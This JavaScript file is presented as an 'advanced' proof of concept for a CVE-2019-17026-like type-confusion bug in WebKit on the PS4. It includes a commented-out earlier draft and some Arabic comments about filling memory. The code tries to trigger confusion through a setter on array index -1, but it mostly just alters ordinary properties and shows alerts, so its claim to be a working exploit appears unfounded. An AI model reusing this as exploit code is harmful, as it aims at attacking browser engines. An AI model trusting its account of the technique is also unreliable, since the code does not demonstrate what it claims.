/*
const NUM_ITERATIONS = 10;
const ARRAY_LENGTH = 10000; 


let arr1 = [];
let arr2 = [1.1, 2.2, , 4.4];
let TARGET = { secret: 0x12345678 };
let BUFFER = new Array(10000);


arr2.__defineSetter__("-1", function(x) {
    alert('Setter called on -1, deleting arr1.x');
    delete arr1.x;
});

function f(b, index, target) {
    let ai = { x4: 42 };
    let aT = { x4: 1337 };
    arr1.x = ai;
    if (b) arr1.x = aT;
    arr2[index] = 1.1;
    try {
        let result = arr1.x.x4;
        alert('Result of arr1.x.x4 = ' + result);
    } catch (e) {
        alert('Crash or Type Confusion: ' + e);
    }
    if (index === -1 && target) {
        arr1.x = target;
    }
    return arr1.x ? arr1.x.x4 : null;
}

function main() {
    for (let i = 0; i < NUM_ITERATIONS; i++) {
        arr2.length = 4;
        f((i & 1) === 1, 5, null);
    }
    f(true, -1, TARGET); // Trigger with TARGET
    alert('Final arr1.x.x4 = ' + (arr1.x ? arr1.x.x4 : 'undefined'));
    alert('TARGET.secret = ' + TARGET.secret);
}

main();
*/

// Advanced POC for CVE-2019-17026-like Type Confusion in WebKit on PS4 10.xx
const NUM_ITERATIONS = 10;
const ARRAY_LENGTH = 1000; // زيادة الحجم لزيادة احتمال التداخل

let OBJ = { a: 41 };
OBJ.a = 42;
let TARGET = { secret: 0x12345678, extra: 0x87654321 };
let OTHER = { value: 0xdeadbeef };
let BUFFER = new Array(10000); // مصفوفة كبيرة لملء الذاكرة

function f(obj, idx, targetAddr) {
    let v = OBJ.a;
    alert('Before write, OBJ.a = ' + OBJ.a);
    obj[idx] = v;
    if (targetAddr && idx === -1) {
        try {
            obj[-1] = targetAddr;
            alert('Attempted to write TARGET address to obj[-1]: ' + targetAddr);
        } catch (e) {
            alert('Error writing to obj[-1]: ' + e);
        }
    }
    alert('After write, OBJ.a = ' + OBJ.a);
    return OBJ.a;
}

function main() {
    for (let i = 0; i < NUM_ITERATIONS; i++) {
        let isLastIteration = i === NUM_ITERATIONS - 1;
        let idx = isLastIteration ? -1 : ARRAY_LENGTH;

        let obj = new Array(ARRAY_LENGTH);
        Object.defineProperty(obj, '-1', {
            set(value) {
                alert('Setter triggered for value ' + value + ', changing OBJ.a to 1337');
                OBJ.a = 1337;
            }
        });

        for (let j = 0; j < ARRAY_LENGTH; j++) {
            if (j === ARRAY_LENGTH / 2) continue;
            obj[j] = j;
        }

        let r = f(obj, idx, isLastIteration ? TARGET : null);
        alert('Iteration ' + i + ': Result = ' + r);
    }
    alert('Final OBJ.a = ' + OBJ.a);
    alert('TARGET.secret = ' + TARGET.secret);
    alert('TARGET.extra = ' + TARGET.extra);
    alert('OTHER.value = ' + OTHER.value);
}

main();